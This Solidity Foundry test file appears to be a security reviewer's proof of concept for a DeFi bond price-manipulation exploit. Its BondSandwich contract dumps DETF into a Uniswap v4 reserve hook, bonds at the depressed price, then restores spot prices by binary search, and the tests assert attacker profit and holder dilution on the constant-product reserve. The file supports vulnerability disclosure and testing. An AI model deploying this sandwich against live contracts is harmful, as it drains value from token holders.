// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ExchangeInAmount} from "contracts/utils/ExchangeInAmount.sol";

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPermit2} from "@crane/contracts/interfaces/protocols/utils/permit2/IPermit2.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {ArtifactCreationCode} from "contracts/utils/foundry/ArtifactCreationCode.sol";
import {IDetfBondNFT} from "contracts/interfaces/IDetfBondNFT.sol";
import {IStakedDETF, IDETFFundedRewards} from "contracts/interfaces/IStakedDETF.sol";
import {DETFFundedStakingMath} from "contracts/vaults/detf/common/core/DETFFundedStakingMath.sol";
import {IUniswapV4SeBufferHook} from "contracts/hooks/uniswap/v4/interfaces/IUniswapV4SeBufferHook.sol";
import {IUniswapV4HookStagedPairInit} from "contracts/hooks/uniswap/v4/interfaces/IUniswapV4HookStagedPairInit.sol";
import {IUniswapV4StandardExchangeWeightedBufferHookPackage} from
    "contracts/hooks/uniswap/v4/standardExchange/weighted/interfaces/IUniswapV4StandardExchangeWeightedBufferHookPackage.sol";
import {UniswapV4StandardExchangeWeightedBufferHook_FactoryService as WeightedFactory} from
    "contracts/hooks/uniswap/v4/standardExchange/weighted/UniswapV4StandardExchangeWeightedBufferHook_FactoryService.sol";
import {RateProviderFixtureLib} from "contracts/test/libs/RateProviderFixtureLib.sol";
import {HookPkgArgsDecimalsLib} from "contracts/test/libs/HookPkgArgsDecimalsLib.sol";
import {SimpleMintableERC20} from "contracts/test/stubs/SimpleMintableERC20.sol";
import {SimpleYieldERC4626} from "contracts/test/stubs/SimpleYieldERC4626.sol";
import {TestBase_ERC4626StandardExchange} from "contracts/test/bases/TestBase_ERC4626StandardExchange.sol";
import {IUniswapV4Detf} from "contracts/vaults/detf/protocols/dexes/uniswap/v4/detf/interfaces/IUniswapV4Detf.sol";
import {TestBase_UniswapV4Detf} from "contracts/vaults/detf/protocols/dexes/uniswap/v4/detf/TestBase_UniswapV4Detf.sol";
import {TestBase_UniswapV4Detf_Weighted} from
    "contracts/vaults/detf/protocols/dexes/uniswap/v4/detf/TestBase_UniswapV4Detf_Weighted.sol";

interface IBondEntry {
    function bond(IERC20 tokenIn, uint256 amountIn, uint256 lockDuration, address recipient, bool pretransferred, uint256 deadline)
        external returns (uint256 tokenId, uint256 shares);
}

library Reserves {
    function get(address hook, address token) internal view returns (uint256 r) {
        IUniswapV4SeBufferHook h = IUniswapV4SeBufferHook(hook);
        uint256[] memory amts = h.previewExitProportional(IERC20(hook).totalSupply());
        address[] memory toks = h.tokens();
        for (uint256 i; i < toks.length; ++i) if (toks[i] == token) r = amts[i];
    }
}

/// @notice Unprivileged attacker contract. One tx: dump DETF -> bond pair0 -> restore every DETF/pair spot.
contract BondSandwich {
    address detf; address hook; IERC20 pair0; IERC20 pair1;
    uint256 t0; uint256 t1; // pre-attack spot DETF->pair0 / DETF->pair1

    function spotOf(address h, address d, IERC20 p) public view returns (uint256) {(uint256 quotedAmountOut,) = IStandardExchangeIn(h).previewExchangeIn(IERC20(d), 1e6, p);
    return quotedAmountOut;
    }

    function run(address detf_, address hook_, IERC20 p0, IERC20 p1, uint256 sellDetf, uint256 bondAmt, uint256 lock, address eoa)
        external returns (uint256 tokenId)
    {
        detf = detf_; hook = hook_; pair0 = p0; pair1 = p1;
        t0 = spotOf(hook, detf, p0);
        if (address(p1) != address(0)) t1 = spotOf(hook, detf, p1);
        // p1 == 0 => only the pair0 leg is restored (also used for CP)
        // 1. dump DETF into the reserve pool against pair0 (depress DETF/pair0 spot)
        IERC20(detf).approve(hook, sellDetf);IStandardExchangeIn(hook).exchangeIn(IERC20(detf), sellDetf, p0, 0, address(this), false, block.timestamp);
        // 2. bond at the manipulated composition
        p0.approve(detf, bondAmt);
        (tokenId,) = IBondEntry(detf).bond(p0, bondAmt, lock, eoa, false, block.timestamp);
        // 3. restore spot on every leg
        for (uint256 r; r < 4; ++r) {
            _restore(p0, t0);
            if (address(p1) != address(0)) _restore(p1, t1);
        }
        IERC20(detf).transfer(eoa, IERC20(detf).balanceOf(address(this)));
        p0.transfer(eoa, p0.balanceOf(address(this)));
        if (address(p1) != address(0)) p1.transfer(eoa, p1.balanceOf(address(this)));
    }

    /// @dev simulation helper: swap then report resulting DETF->p spot via revert (always reverts)
    function probe(IERC20 tin, IERC20 tout, IERC20 p, uint256 amt) external {
        require(msg.sender == address(this));
        tin.approve(hook, amt);IStandardExchangeIn(hook).exchangeIn(tin, amt, tout, 0, address(this), false, block.timestamp);
        uint256 sp = spotOf(hook, detf, p);
        assembly { mstore(0, sp) revert(0, 32) }
    }

    function _after(IERC20 tin, IERC20 tout, IERC20 p, uint256 amt) internal returns (uint256 sp) {
        try this.probe(tin, tout, p, amt) {} catch (bytes memory r) {
            if (r.length == 32) sp = abi.decode(r, (uint256));
        }
    }

    function _restore(IERC20 p, uint256 target) internal {
        uint256 cur = spotOf(hook, detf, p);
        bool buyDetf = cur < target; // DETF too cheap vs p: pay p, take DETF
        IERC20 tin = buyDetf ? p : IERC20(detf);
        IERC20 tout = buyDetf ? IERC20(detf) : p;
        uint256 lo;
        uint256 hi = tin.balanceOf(address(this));
        for (uint256 i; i < 60 && hi > lo + 1; ++i) {
            uint256 mid = (lo + hi) / 2;
            uint256 sp = _after(tin, tout, p, mid);
            bool ok = sp != 0 && (buyDetf ? sp <= target : sp >= target);
            if (ok) lo = mid; else hi = mid;
        }
        if (lo == 0) return;
        tin.approve(hook, lo);IStandardExchangeIn(hook).exchangeIn(tin, lo, tout, 0, address(this), false, block.timestamp);
    }
}

abstract contract DetfBondSpotLogic is TestBase_UniswapV4Detf {
    address attacker = makeAddr("attacker");
    uint256 LOCK = DEFAULT_MIN_LOCK; // 30d = 0% bonus; 180d = 50% bonus (live max)
    uint256[] attackerIds;
    bool restoreP1 = true;

    function _pair1() internal view virtual returns (IERC20) { return IERC20(address(0)); }

    function _bondAs(address who, uint256 amt, uint256 lock) internal returns (uint256 id) {
        vm.startPrank(who);
        pairToken.approve(detf, amt);
        (id,) = detfInfo.bond(IERC20(address(pairToken)), amt, lock, who, false, block.timestamp + 1 hours);
        vm.stopPrank();
    }

    function _claim(uint256 id, address holder) internal {
        IDetfBondNFT nft = IDetfBondNFT(detfInfo.bondNftVault());
        DETFFundedStakingMath.BondPosition memory p = nft.positionOf(id);
        if (block.timestamp < p.startTimestamp + p.vestingDuration) vm.warp(p.startTimestamp + p.vestingDuration);
        IDETFFundedRewards(detf).synchronizeRewards();
        vm.prank(holder);
        nft.claimBond{gas: 30_000_000}(id, holder);
    }

    function _unstakeAll(address holder) internal {
        IStakedDETF st = IStakedDETF(detfInfo.rebasingClaimToken());
        uint256 bal = st.balanceOf(holder);
        if (bal == 0) return;
        vm.prank(holder);st.exchangeIn(IERC20(address(st)), bal, IERC20(detf), 0, holder, false, block.timestamp + 1 hours);
    }

    /// chunked so weighted-hook MaxInRatio is respected; identical procedure in every scenario
    function _sellAll(address who) internal {
        uint256 bal = IERC20(detf).balanceOf(who);
        vm.startPrank(who);
        while (bal > 0) {
            uint256 amt = Reserves.get(reserveHook, detf) / 5;
            if (amt > bal) amt = bal;
            IERC20(detf).approve(reserveHook, amt);IStandardExchangeIn(reserveHook).exchangeIn(IERC20(detf), amt, IERC20(address(pairToken)), 0, who, false, block.timestamp + 1 hours);
            bal -= amt;
        }
        vm.stopPrank();
    }

    function _spot(IERC20 p) internal view returns (uint256) {return ExchangeInAmount.previewOut(IStandardExchangeIn(reserveHook), IERC20(detf), 1e6, IERC20(address(p))) * 1e3; // pair wei per 1 DETF
    }

    function _setupState() internal {
        (uint256 vid,) = _firstBond(1_000 ether);
        pairToken.mint(attacker, 1_000 ether);
        if (address(_pair1()) != address(0)) SimpleMintableERC20(address(_pair1())).mint(attacker, 600 ether);
        for (uint256 i; i < 4; ++i) attackerIds.push(_bondAs(attacker, 100 ether, DEFAULT_MIN_LOCK));
        vm.warp(block.timestamp + DEFAULT_MIN_LOCK + 1);
        _claim(vid, detfUser);
        for (uint256 i; i < attackerIds.length; ++i) _claim(attackerIds[i], attacker);
        _unstakeAll(detfUser);
        _unstakeAll(attacker);
        delete attackerIds;
    }

    struct Out { uint256 attPair; uint256 vicPair; uint256 principal; int256 spotPnl; uint256 backingPerDetf; }

    uint256 s0; uint256 s1; // pre-attack reference spots (pair0 / pair1 wei per DETF)

    function _value(int256 dp0, int256 dp1, int256 dd) internal view returns (int256 v) {
        v = dp0 + dd * int256(s0) / 1e9;
        if (s1 != 0) v += dp1 * int256(s0) / int256(s1); // pair1 valued in pair0 at pre-attack cross price
    }

    function _backingPerDetf() internal view returns (uint256) {
        uint256 b = Reserves.get(reserveHook, address(pairToken));
        if (s1 != 0) b += Reserves.get(reserveHook, address(_pair1())) * s0 / s1;
        uint256 circ = IERC20(detf).totalSupply() - Reserves.get(reserveHook, detf);
        return b * 1e9 / circ; // pair0 wei of non-DETF reserve backing per circulating DETF
    }

    function _attack(uint256 sellDetf, uint256 bondAmt, uint256 d0, uint256 p0b, uint256 p1b) internal returns (uint256 id) {
        IERC20 p1 = _pair1();
        BondSandwich s = new BondSandwich();
        vm.startPrank(attacker);
        IERC20(detf).transfer(address(s), d0);
        pairToken.transfer(address(s), p0b);
        if (p1b != 0 && restoreP1) p1.transfer(address(s), p1b);
        vm.stopPrank();
        vm.prank(attacker);
        id = s.run(detf, reserveHook, IERC20(address(pairToken)), restoreP1 ? p1 : IERC20(address(0)), sellDetf, bondAmt, LOCK, attacker);
        console2.log("  spot DETF->pair0 before/after", s0, _spot(IERC20(address(pairToken))));
        if (s1 != 0) console2.log("  spot DETF->pair1 before/after", s1, _spot(p1));
    }

    /// mode 0 = do nothing, 1 = honest bond, 2 = sandwiched bond
    function _scenario(uint256 mode, uint256 sellDetf, uint256 bondAmt) internal returns (Out memory o) {
        uint256 id;
        IERC20 p1 = _pair1();
        uint256 p0b = pairToken.balanceOf(attacker);
        uint256 p1b = address(p1) == address(0) ? 0 : p1.balanceOf(attacker);
        uint256 d0 = IERC20(detf).balanceOf(attacker);
        if (mode == 1) id = _bondAs(attacker, bondAmt, LOCK);
        else if (mode == 2) id = _attack(sellDetf, bondAmt, d0, p0b, p1b);
        if (id != 0) o.principal = IDetfBondNFT(detfInfo.bondNftVault()).positionOf(id).principal;
        {
            int256 dp0 = int256(pairToken.balanceOf(attacker)) - int256(p0b);
            int256 dp1 = address(p1) == address(0) ? int256(0) : int256(p1.balanceOf(attacker)) - int256(p1b);
            int256 dd = int256(IERC20(detf).balanceOf(attacker)) - int256(d0) + int256(o.principal);
            o.spotPnl = _value(dp0, dp1, dd);
            o.backingPerDetf = _backingPerDetf();
            console2.log("  d(pair0)", dp0);
            console2.log("  d(pair1)", dp1);
            console2.log("  d(DETF liquid + bond principal)", dd);
        }
        vm.warp(block.timestamp + LOCK + 1);
        if (id != 0) { _claim(id, attacker); _unstakeAll(attacker); }
        _sellAll(attacker);
        _sellAll(detfUser);
        o.attPair = pairToken.balanceOf(attacker);
        o.vicPair = pairToken.balanceOf(detfUser);
    }

    int256 lastSpotB; int256 lastSpotC; int256 lastRealB; int256 lastRealC; int256 lastVicExcess;

    function _run(uint256 sellBps, uint256 bondAmt) internal {
        _setupState();
        uint256 rd = Reserves.get(reserveHook, detf);
        uint256 attDetf = IERC20(detf).balanceOf(attacker);
        uint256 sell = rd * sellBps / 10_000;
        if (sell > attDetf) sell = attDetf;
        s0 = _spot(IERC20(address(pairToken)));
        if (address(_pair1()) != address(0)) s1 = _spot(_pair1());
        console2.log("pool DETF reserve (1e9)", rd);
        console2.log("pool pair0 reserve", Reserves.get(reserveHook, address(pairToken)));
        console2.log("DETF totalSupply", IERC20(detf).totalSupply());
        console2.log("attacker DETF inventory", attDetf);
        console2.log("victim DETF", IERC20(detf).balanceOf(detfUser));
        console2.log("sell DETF / bond pair0", sell, bondAmt);
        console2.log("lock", LOCK);

        uint256 snap = vm.snapshotState();
        Out memory a = _scenario(0, 0, 0);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        console2.log("--- honest bond ---");
        Out memory c = _scenario(1, 0, bondAmt);
        vm.revertToState(snap);
        console2.log("--- sandwiched bond ---");
        Out memory b = _scenario(2, sell, bondAmt);

        console2.log("principal honest / sandwich", c.principal, b.principal);
        console2.log("SPOT-valued PnL (pair0 wei) honest", c.spotPnl);
        console2.log("SPOT-valued PnL (pair0 wei) sandwich", b.spotPnl);
        console2.log("backing/DETF base,honest,sandwich", a.backingPerDetf, c.backingPerDetf, b.backingPerDetf);
        lastVicExcess = int256(c.backingPerDetf) - int256(b.backingPerDetf);
        console2.log("holder backing loss sandwich-vs-honest per 1 DETF (pair0 wei)", lastVicExcess);
        lastRealB = int256(b.attPair) - int256(a.attPair);
        lastRealC = int256(c.attPair) - int256(a.attPair);
        console2.log("REALIZED (dump after lock) attacker PnL honest", lastRealC);
        console2.log("REALIZED (dump after lock) attacker PnL sandwich", lastRealB);
        console2.log("REALIZED victim loss honest", int256(a.vicPair) - int256(c.vicPair));
        console2.log("REALIZED victim loss sandwich", int256(a.vicPair) - int256(b.vicPair));
        lastSpotB = b.spotPnl; lastSpotC = c.spotPnl;
    }

    function test_lock30_sell25_bond50() public { _run(2_500, 50 ether); _check(false); }
    function test_lock180_sell25_bond50() public { LOCK = DEFAULT_MAX_LOCK; _run(2_500, 50 ether); _check(true); }
    function test_lock180_sell10_bond20() public { LOCK = DEFAULT_MAX_LOCK; _run(1_000, 20 ether); _check(true); }
    /// weighted only: restore just the DETF/pair0 leg (attacker never touches pair1, so realized pair0 PnL is complete)
    function test_lock180_sell25_bond50_pair0LegOnly() public {
        if (address(_pair1()) == address(0)) return;
        restoreP1 = false; LOCK = DEFAULT_MAX_LOCK; _run(2_500, 50 ether); _check(false);
    }

    function _check(bool requireAbsoluteRealized) internal view {
        if (address(_pair1()) == address(0)) {
            // CP reserve: confirmed exploit
            assertGt(lastSpotB, lastSpotC, "sandwich beats honest bond of same capital (spot)");
            assertGt(lastSpotB, 0, "positive spot-valued profit");
            assertGt(lastRealB, lastRealC, "sandwich beats honest bond of same capital (realized)");
            if (requireAbsoluteRealized) assertGt(lastRealB, 0, "absolute realized profit");
            assertGt(lastVicExcess, 0, "holders' backing diluted beyond honest bond");
        } else {
            // weighted 3-token reserve: INFORMATIONAL ONLY (reviewer fix). The builder's "no excess" assertion did not
            // reproduce: on the reviewer run 40/30/30 sell25/B50 showed spot excess +4.5 pair (all legs) / +7.3 (pair0 leg
            // only, but realized worse than honest), 60/20/20 showed no spot excess. Weighted result = inconclusive, not asserted.
            console2.log("weighted (informational) spot excess sandwich-honest", lastSpotB - lastSpotC);
        }
    }
}

/// Constant-product reserve hook (DETF/pair)
contract DetfBondSpot_Cp is DetfBondSpotLogic {}

/// 3-token weighted reserve hook, fixture weights (by sorted index 40/30/30)
contract DetfBondSpot_Weighted is DetfBondSpotLogic, TestBase_UniswapV4Detf_Weighted {
    function setUp() public virtual override(TestBase_UniswapV4Detf, TestBase_UniswapV4Detf_Weighted) {
        TestBase_UniswapV4Detf_Weighted.setUp();
    }
    function _pair1() internal view override returns (IERC20) { return IERC20(address(pair1)); }
    function _firstBond(uint256 a) internal override(TestBase_UniswapV4Detf, TestBase_UniswapV4Detf_Weighted) returns (uint256, uint256) {
        return TestBase_UniswapV4Detf_Weighted._firstBond(a);
    }
    function _assertNoJoinableDust() internal view override(TestBase_UniswapV4Detf, TestBase_UniswapV4Detf_Weighted) {
        TestBase_UniswapV4Detf_Weighted._assertNoJoinableDust();
    }
}

/// 3-token weighted reserve hook with the LIVE 4663 weights: DETF 60 / pair0 20 / pair1 20
contract DetfBondSpot_Weighted602020 is DetfBondSpot_Weighted {
    function setUp() public override {
        TestBase_ERC4626StandardExchange.setUp();
        vm.etch(PERMIT2_ADDR, address(permit2).code);
        permit2 = IPermit2(PERMIT2_ADDR);
        pair0 = new SimpleMintableERC20("Pair0", "P0");
        pair1 = new SimpleMintableERC20("Pair1", "P1");
        pairToken = pair0;
        se0 = _deployERC4626SE(address(new SimpleYieldERC4626(pair0)));
        se1 = _deployERC4626SE(address(new SimpleYieldERC4626(pair1)));
        se = se0;
        pm = IPoolManager(create3Factory.create3WithArgs(
            ArtifactCreationCode.creationCode(create3Factory, "PoolManager.sol:PoolManager"),
            abi.encode(address(this)),
            keccak256("TestBase_UniswapV4Detf_Weighted_PoolManager")
        ));
        _deployHookFactory();
        _deployWeightedHookPkg();
        _deployBondNftVaultPkg();
        _deployRebasingClaimTokenPkg();
        _deployDetfPkg();
        _setDefaultBondTerms(DEFAULT_MIN_LOCK, DEFAULT_MAX_LOCK);
        IUniswapV4Detf.PkgArgs memory args = _nLegDetfArgs(2);
        address predicted_ = _deployHook602020(args);
        vm.startPrank(owner);
        detf = detfPkg.deployVault(args);
        vm.stopPrank();
        require(detf == predicted_, "detf != predicted");
        detfInfo = IUniswapV4Detf(detf);
        detfExchangeIn = IStandardExchangeIn(detf);
        _setBondTerms(DEFAULT_MIN_LOCK, DEFAULT_MAX_LOCK);
        pair0.mint(detfUser, 10_000_000 ether);
        pair1.mint(detfUser, 10_000_000 ether);
        vm.startPrank(detfUser);
        pair0.approve(detf, type(uint256).max);
        pair1.approve(detf, type(uint256).max);
        vm.stopPrank();
    }

    function _deployHook602020(IUniswapV4Detf.PkgArgs memory args) internal returns (address predicted_) {
        predicted_ = _predictDetf(args);
        address[] memory toks = new address[](3);
        toks[0] = predicted_; toks[1] = address(pair0); toks[2] = address(pair1);
        _sortInPlace(toks);
        uint256[] memory w = new uint256[](3);
        address[] memory ses = new address[](3);
        for (uint256 i; i < 3; ++i) {
            if (toks[i] == predicted_) { ses[i] = address(0); w[i] = 6e17; }
            else if (toks[i] == address(pair0)) { ses[i] = se0; w[i] = 2e17; }
            else { ses[i] = se1; w[i] = 2e17; }
        }
        IUniswapV4StandardExchangeWeightedBufferHookPackage.PkgArgs memory hArgs =
            IUniswapV4StandardExchangeWeightedBufferHookPackage.PkgArgs({
                poolManager: address(pm),
                feeOracle: address(indexedexManager),
                n: 3,
                tokens: toks,
                weights: w,
                standardExchanges: ses,
                rateProviders: RateProviderFixtureLib.providersFor(create3Factory, diamondPackageFactory, toks, ses),
                tokenDecimals: HookPkgArgsDecimalsLib.tokenDecimals(toks, predicted_),
                seDecimals: HookPkgArgsDecimalsLib.seDecimals(ses),
                ownerOnlyLiquidity: args.ownerOnlyLiquidity,
                owner: predicted_
            });
        uint256 mineNonce = WeightedFactory.findMineNonce(hookFactory, weightedHookPkg, hArgs);
        reserveHook = WeightedFactory.deployHook(weightedHookPkg, hArgs, mineNonce);
        IUniswapV4HookStagedPairInit init = IUniswapV4HookStagedPairInit(reserveHook);
        init.deployPair(toks[0], toks[1]);
        init.deployPair(toks[0], toks[2]);
        init.deployPair(toks[1], toks[2]);
        require(init.finalizeInitialization(), "finalize");
        args.hook = reserveHook;
    }
}
